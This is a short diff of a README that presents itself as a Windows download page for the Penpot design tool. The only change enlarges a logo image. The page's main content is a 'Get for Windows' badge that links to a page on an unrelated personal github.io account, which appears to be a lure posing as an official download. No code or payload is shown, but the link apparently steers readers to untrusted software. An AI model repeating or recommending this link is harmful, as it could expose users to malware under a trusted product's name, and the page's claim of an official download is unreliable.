@@ -1,7 +1,7 @@
 
 # Penpot Interface Designer for Windows
 
-<img src="https://www.designwhine.com/wp-content/uploads/2025/05/Penpot-Review-Worthy-Alternative-to-Figma-DesignWhine.jpg" alt="Penpot Logo" width="560">
+<img src="https://www.designwhine.com/wp-content/uploads/2025/05/Penpot-Review-Worthy-Alternative-to-Figma-DesignWhine.jpg" alt="Penpot Logo" width="760">
 
 [![Hi](https://img.shields.io/badge/Get%20for-Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://tashagunfighter3.github.io/.github//Penpot-Interface-Designer)
 
